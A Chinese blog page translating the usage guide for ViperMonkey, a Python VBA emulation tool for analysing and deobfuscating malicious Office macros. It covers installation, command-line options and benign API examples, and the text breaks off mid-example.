<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>恶意文档分析工具 ViperMonkey 使用说明 | zeronohacker</title><meta name="keywords" content="ViperMonkey,Office,VBA"><meta name="author" content="zeronohacker"><meta name="copyright" content="zeronohacker"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文为 ViperMonkey 的中文版，原文链接：https:&#x2F;&#x2F;github.com&#x2F;decalage2&#x2F;ViperMonkey&#x2F;   介绍ViperMonkey 是一个用 Python 写的 VBA 仿真模拟引擎，用来分析和反混淆 MS Office 文件 (Word，Excel，PowerPoint，Publisher 等等) 中包含的恶意宏代码，你可以查看 这篇文章，一个用 viper">
<meta property="og:type" content="article">
<meta property="og:title" content="恶意文档分析工具 ViperMonkey 使用说明">
<meta property="og:url" content="https://zeronohacker.github.io/2020/09/09/maldoc-analysis-tool-vipermonkey-instruction/index.html">
<meta property="og:site_name" content="zeronohacker">
<meta property="og:description" content="本文为 ViperMonkey 的中文版，原文链接：https:&#x2F;&#x2F;github.com&#x2F;decalage2&#x2F;ViperMonkey&#x2F;   介绍ViperMonkey 是一个用 Python 写的 VBA 仿真模拟引擎，用来分析和反混淆 MS Office 文件 (Word，Excel，PowerPoint，Publisher 等等) 中包含的恶意宏代码，你可以查看 这篇文章，一个用 viper">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://image.zeronohacker.com/top_img/2020/09/09/media_ELBFukFX0AAZwGB.jpg">
<meta property="article:published_time" content="2020-09-09T13:16:42.000Z">
<meta property="article:modified_time" content="2021-09-19T14:05:55.013Z">
<meta property="article:author" content="zeronohacker">
<meta property="article:tag" content="Office">
<meta property="article:tag" content="ViperMonkey">
<meta property="article:tag" content="VBA">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.zeronohacker.com/top_img/2020/09/09/media_ELBFukFX0AAZwGB.jpg"><link rel="shortcut icon" href="https://image.zeronohacker.com/favicon.png"><link rel="canonical" href="https://zeronohacker.github.io/2020/09/09/maldoc-analysis-tool-vipermonkey-instruction/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '恶意文档分析工具 ViperMonkey 使用说明',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-09-19 22:05:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script async src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="zeronohacker" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image.zeronohacker.com/header.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://image.zeronohacker.com/top_img/2020/09/09/media_ELBFukFX0AAZwGB.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zeronohacker</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">恶意文档分析工具 ViperMonkey 使用说明</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-09T13:16:42.000Z" title="发表于 2020-09-09 21:16:42">2020-09-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-09-19T14:05:55.013Z" title="更新于 2021-09-19 22:05:55">2021-09-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/">工具源码</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="恶意文档分析工具 ViperMonkey 使用说明"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>本文为 ViperMonkey 的中文版，原文链接：<a target="_blank" rel="noopener" href="https://github.com/decalage2/ViperMonkey/">https://github.com/decalage2/ViperMonkey/</a></p>
</blockquote>
<a class="ghcard" rel="external nofollow noopener noreferrer noopener" target="_blank" href="https://github.com/decalage2/ViperMonkey"><img src="https://github-readme-stats.vercel.app/api/pin/?username=decalage2&repo=ViperMonkey&theme=blue-green&show_owner=true"/></a>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ViperMonkey 是一个用 Python 写的 VBA 仿真模拟引擎，用来分析和反混淆 MS Office 文件 (Word，Excel，PowerPoint，Publisher 等等) 中包含的恶意宏代码，你可以查看 <a target="_blank" rel="noopener" href="http://decalage.info/vba_emulation">这篇文章</a>，一个用 vipermonkey 分析的真实案例。在 2019 年欧洲黑帽大会会议上 ViperMonkey 被拿来做过演示 –&gt; <a target="_blank" rel="noopener" href="https://decalage.info/en/bheu2019">演讲 PPT 下载</a> 和 <a target="_blank" rel="noopener" href="https://youtu.be/l5sMPGjtKn0?list=PLH15HpR5qRsXiPOP3gxN6ultoj0rAR6Yn&amp;t=1118">YouTube 视频</a>。</p>
<p>ViperMonkey 项目由 Philippe Lagadec 在 2015-2016 年创建，该项目保存在 <a target="_blank" rel="noopener" href="https://github.com/decalage2/ViperMonkey">https://github.com/decalage2/ViperMonkey</a> 中。自 2017 年 11 月以来，大部分开发工作由 Kirk Sayre 和其他贡献者在存储库 <a target="_blank" rel="noopener" href="https://github.com/kirk-sayre-work/ViperMonkey">https://github.com/kirk-sayre-work/ViperMonkey</a> 中完成。主存储库会定期进行同步，但是最新的改进通常是在 Kirk 的版本中。</p>
<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><ul>
<li>ViperMonkey 是分析恶意文档的实验性 VBA 引擎，它适用于部分恶意文档并非全部</li>
<li>目前，VBA 仿真模拟引擎的解析速度非常慢 (有关如何提高速度的信息，请参见加速部分)</li>
<li>VBA 仿真模拟非常复杂和困难，因为 VBA 会调用所有可能出现的 DLL 和 ActiveX 对象</li>
<li>这个开源项目只是在我的业余时间进行开发，所以不要期待奇迹，如果你愿意提供帮助，我将不胜感激</li>
</ul>
<h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><div class="timeline">
<div class="timenode"><div class="meta"><p><p>2018-03-22 v0.06</p>
</p></div><div class="body"><ol><li>添加新特性和 bug 修复 by Kirk Sayre</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2018-03</p>
</p></div><div class="body"><ol><li>增加了对解析一些无效的 VBA 语句的支持</li><li>其他解析修复</li><li>增加了对在非标准函数上启动仿真模拟的支持</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2018-02</p>
</p></div><div class="body"><ol><li>增加对 <code>Environ、IIf、Base64DecodeString、CLng、Close、Put、Run、InStrRev、LCase、RTrim、LTrim、AscW、AscB</code> 和 <code>CurDir</code> 的支持</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2018-01</p>
</p></div><div class="body"><ol><li>增加对在模拟运行中释放文件的支持</li><li>增加对 <code>For Each loops</code> 的支持</li><li>增加对 <code>While Wend loops</code> 的支持</li><li>能够处理 <code>Exit Do</code></li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2018-01-12 v0.05</p>
</p></div><div class="body"><ol><li>添加新特性和 bug 修复 by Kirk Sayre</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2017-12-15</p>
</p></div><div class="body"><ol><li>增加对 <code>Select</code> 和 <code>Do Loops</code> 的支持</li><li>增加对 <code>End Sub</code> 和 返回 0 个参数语句的支持</li><li>增加对 <code>#if</code> 结构的支持</li><li>每个 VBA 流都在一个单独的线程中进行解析</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2017-11-28</p>
</p></div><div class="body"><ol><li>增加对 Private 类型声明的解析支持</li><li>在最终报告中记录 <code>CreateProcessA</code> 的调用</li><li>处理本地定义的 <code>Application.Run()</code></li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2017-11-23</p>
</p></div><div class="body"><ol><li>增加对 <code>Abs、Fix、Hex、String、CByte、Atn、Dir、RGB、Log、Cos、Exp、Sin、Str</code> 和 <code>Val</code> 的支持</li><li>增加对 <code>Exit Function</code> 的支持</li><li>更改了数学运算符，使其也能处理整数的字符串表示</li><li>在循环上添加了可配置的迭代限制</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2017-11-14</p>
</p></div><div class="body"><ol><li>增加对 <code>InStr、Replace、Sgn、Sqr、UBound、LBound、Trim、StrConv、Split、StrReverse</code> 和 <code>Int</code> 函数的支持</li><li>增加对字符串特征标注的支持</li><li>增加对负整数的支持</li><li>增加对 <code>if-than-else</code> 语句的支持</li><li>增加了对声明的常量和全局变量初始值的支持</li><li>处理布尔表达式当中变量赋值问题</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2017-11-03</p>
</p></div><div class="body"><ol><li>增加对 <code>Left()、Right()、Array()</code> 和 <code>BuiltInDocumentProperties()</code> 的支持</li><li>增加对全局变量的支持</li><li>修复一些解析 bug</li><li>增加对 <code>AutoClose()</code> 的支持</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2016-09-26</p>
</p></div><div class="body"><ol><li>首次推出版本</li></ol></div></div>

<div class="timenode"><div class="meta"><p><p>2015-02-28</p>
</p></div><div class="body"><ol><li>第一个开发版本</li></ol></div></div>
</div>
<h2 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h2><p>出于性能原因，强烈建议使用 PyPy (快 5 倍)，但是如果你不能使用 PyPy，也可以使用普通的 Python 解释器 (CPython) 运行 ViperMonkey。</p>
<h3 id="使用-PyPy-安装-推荐"><a href="#使用-PyPy-安装-推荐" class="headerlink" title="使用 PyPy 安装 (推荐)"></a>使用 PyPy 安装 (推荐)</h3><ul>
<li>如果你的系统没有安装 PyPy，可在 <a target="_blank" rel="noopener" href="http://pypy.org/download.html">http://pypy.org/download.html</a> 上下载 PyPy2.7 (不是 3.x)</li>
<li>使用 pypy 检查 pip 是否已安装，运行 <code>pypy -m pip</code></li>
<li>如果 pip 也没安装，windows 下运行 <code>pypy -m ensurepip</code>，Linux/Mac 下运行 <code>sudo -H pypy -m ensurepip</code></li>
<li>确保 pip 为最新版本，运行 <code>pypy -m pip install -U pip</code></li>
<li>下载 ViperMonkey 文件: <a target="_blank" rel="noopener" href="https://github.com/decalage2/ViperMonkey/archive/master.zip">https://github.com/decalage2/ViperMonkey/archive/master.zip</a></li>
<li>将下载下来的解压到一个文件夹内，然后进入该文件内打开 shell/cmd</li>
<li>如果是在 ubuntu 下，需安装 pypy-dev，运行 <code>sudo apt-get install pypy-dev</code></li>
<li>安装依赖，windows 下运行 <code>pypy -m pip install -U -r requirements.txt</code>，Linux/Mac 下运行 <code>sudo -H pypy -m pip install -U -r requirements.txt</code></li>
<li>检查下 ViperMonkey 运行是否会出错，运行 <code>pypy vmonkey.py</code></li>
</ul>
<h3 id="使用-CPython-安装"><a href="#使用-CPython-安装" class="headerlink" title="使用 CPython 安装"></a>使用 CPython 安装</h3><ul>
<li>请确保你安装了最新的 Python2.7 版本 <a target="_blank" rel="noopener" href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></li>
<li>如果你同时安装了 Python2 和 Python3 版本，在下面的命令中请使用 pip2 替代 pip</li>
<li>确保 pip 更新至最新版本，运行 <code>pip install -U pip</code></li>
<li>使用 pip 下载 ViperMonkey 以及所需的依赖</li>
</ul>
<div class="tabs" id="install-standard-version"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#install-standard-version-1">Windows</button></li><li class="tab"><button type="button" data-href="#install-standard-version-2">Linux/Mac</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="install-standard-version-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U https://github.com/decalage2/ViperMonkey/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="install-standard-version-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install -U https://github.com/decalage2/ViperMonkey/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
<ul>
<li>最后检测运行 ViperMonkey 是否会出错，在任意目录下打开 shell/cmd，简单运行 vmonkey 即可</li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>解析文档中的 VBA 宏</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmonkey &lt;file&gt;</span><br></pre></td></tr></table></figure>
<p>如果你要加快分析速度 (请参见加速部分)，可以这样做</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypy vmonkey.py -s &lt;file&gt;</span><br></pre></td></tr></table></figure>
<p>如果嫌输出太慢和太冗长，可以使用 -l 选项降低日志记录级别</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmonkey -l warning &lt;file&gt;</span><br></pre></td></tr></table></figure>
<h3 id="oletools-版本"><a href="#oletools-版本" class="headerlink" title="oletools 版本"></a>oletools 版本</h3><p>ViperMonkey 需要 oletools 的最新版本，至少 v0.52.3，有几种方式来安装 oletools</p>
<ul>
<li>通过运行 <code>pip install -U oletools</code> 安装最新的 oletools 版本</li>
<li>按照 <a target="_blank" rel="noopener" href="https://github.com/decalage2/oletools/wiki/Install#how-to-install-the-latest-development-version">此处</a> 所述那样，使用 pip 安装 oletools 的最新开发版本</li>
</ul>
<h3 id="如何加速"><a href="#如何加速" class="headerlink" title="如何加速"></a>如何加速</h3><span class='p blue'>pypy</span>
<p>ViperMonkey 使用默认的解析库可能需要很长时间才能解析某些样本，通过使用 pypy 而不是常规的 Python 解释器运行 ViperMonkey，可以大大加快 ViperMonkey 的运行速度 (能快 5 倍左右)。 要使用 pypy，请执行以下操作</p>
<ul>
<li><p>按照 <a target="_blank" rel="noopener" href="https://pypy.org/download.html">此处</a> 的说明来安装 pypy</p>
</li>
<li><p>安装以下 Python 软件包，可以下载 .tar.gz 并为每个软件包运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pypy setup.py install</span><br></pre></td></tr></table></figure>
<p>(请注意使用 pypy 而不是 python) 来完成</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/setuptools">setuptools</a></li>
<li><a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/colorlog">colorlog</a></li>
<li><a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/olefile">olefile</a></li>
<li><a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/PrettyTable">prettytable</a></li>
<li><a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/pyparsing/2.2.0">pyparsing</a></li>
</ul>
</li>
</ul>
<span class='p blue'>去除无用的语句</span>
<p>ViperMonkey 命令行选项 -s 告诉 ViperMonkey 在解析和仿真模拟之前从 Visual Basic 宏代码中删除无用的语句。对于某些恶意文档，这可以大大加快分析速度。</p>
<span class='p blue'>模拟文件写入</span>
<p>ViperMonkey 模拟文件写入行为，ViperMonkey 分析结果中报告了释放文件的 SHA256 哈希值，实际释放的文件保存在目录 MALDOC_artifacts/ 中，其中 MALDOC 是分析的恶意文件名称。</p>
<span class='p blue'>模拟特定的 VBA 函数</span>
<p>默认情况下，ViperMonkey 从标准宏自动运行函数 (如 <strong>AutoOpen，Document_Open，Document_Close</strong> 等) 开始模拟行为。<strong>在某些情况下，你可能希望从非标准自动运行函数开始模拟行为，可通过 -i 命令行选项支持此功能</strong>。要从 Foo 函数开始模拟行为，请使用命令行选项 <code>-i Foo</code>。要模拟从多个非标准入口点开始的行为，请使用命令行选项 <code>-i &quot;Foo，Bar，Baz&quot;</code> (请注意，入口点函数名称以逗号分隔，并且必须用双引号引起来)。</p>
<h2 id="API-接口"><a href="#API-接口" class="headerlink" title="API 接口"></a>API 接口</h2><p>ViperMonkey 还包含 API 接口，可用于对示例进行更精细的控制仿真模拟或可以将其集成到现有项目中。API 允许你遍历和仿真模拟 VBA 代码的某些部分，并采用按需解析的方法来提高速度。</p>
<h3 id="直接-VBA-仿真模拟"><a href="#直接-VBA-仿真模拟" class="headerlink" title="直接 VBA 仿真模拟"></a>直接 VBA 仿真模拟</h3><p>模拟某些代码的最简单方法是使用 vipermonkey.eval() 函数，这将解析并模拟每行，并返回最后一行的结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line"><span class="built_in">print</span> vipermonkey.<span class="built_in">eval</span>(<span class="string">&#x27;&quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)&#x27;</span>)</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dim m1, m2, m3 As String</span></span><br><span class="line"><span class="string">m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">m2 = &quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)</span></span><br><span class="line"><span class="string">m3 = &quot;!!!&quot;</span></span><br><span class="line"><span class="string">m1 &amp; m2 &amp; m3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> vipermonkey.<span class="built_in">eval</span>(vba_code)</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">world</span><br><span class="line">hello world!!!</span><br></pre></td></tr></table></figure>
<p>如果代码在最后一行没有返回任何内容，或者你想检查其他变量，可以提供一个 Context 对象，Context 对象用于保存所有局部/全局变量，创建的文件对象以及执行的唯一操作 (稍后会详细介绍)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dim m1, m2, m3, result As String</span></span><br><span class="line"><span class="string">m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">m2 = &quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)</span></span><br><span class="line"><span class="string">m3 = &quot;!!!&quot;</span></span><br><span class="line"><span class="string">result = m1 &amp; m2 &amp; m3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br><span class="line"><span class="built_in">print</span> context.<span class="built_in">locals</span></span><br><span class="line"><span class="built_in">print</span> context[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># same as context.locals[&#x27;result&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;m1&#x27;: &#x27;hello &#x27;, &#x27;result&#x27;: &#x27;hello world!!!&#x27;, &#x27;m3&#x27;: &#x27;!!!&#x27;, &#x27;m2&#x27;: &#x27;world&#x27;&#125;</span><br><span class="line">hello world!!!</span><br></pre></td></tr></table></figure>
<h3 id="检查-VBA-代码"><a href="#检查-VBA-代码" class="headerlink" title="检查 VBA 代码"></a>检查 VBA 代码</h3><p>解析源代码是一项艰巨的任务，在不需要触发其解析的内容下，ViperMonkey 可以通过使用 Module 对象来检查模块中的函数和子例程。对于模块类型的对象，你可以使用 <code>.procedures</code>，<code>.functions</code>，<code>.subs</code> 或 <code>.entry_points</code> 属性去访问 VBA 函数，同样可在不需要触发其解析的内容下确定函数名称。<code>.procedures</code> 是 <code>.function</code> 和 <code>.subs</code> 的组合，<code>.entry_points</code> 提供了在一个模块中包含函数的列表，这些函数为在 MS Office 中经常被触发 (例如 Document_Open)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Attribute VB_Name = &quot;ThisDocument&quot;</span></span><br><span class="line"><span class="string">Attribute VB_Base = &quot;1Normal.ThisDocument&quot;</span></span><br><span class="line"><span class="string">Sub Document_Open()</span></span><br><span class="line"><span class="string">    On Error Resume Next</span></span><br><span class="line"><span class="string">    Dim message As String</span></span><br><span class="line"><span class="string">    message = PrintHello(&quot;Jamie&quot;)</span></span><br><span class="line"><span class="string">    MsgBox message</span></span><br><span class="line"><span class="string">End Sub</span></span><br><span class="line"><span class="string">Function PrintHello(person As String) As String</span></span><br><span class="line"><span class="string">    Dim m1 As String</span></span><br><span class="line"><span class="string">    m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">    PrintHello = m1 &amp; person</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">module = vipermonkey.Module(vba_code)</span><br><span class="line"><span 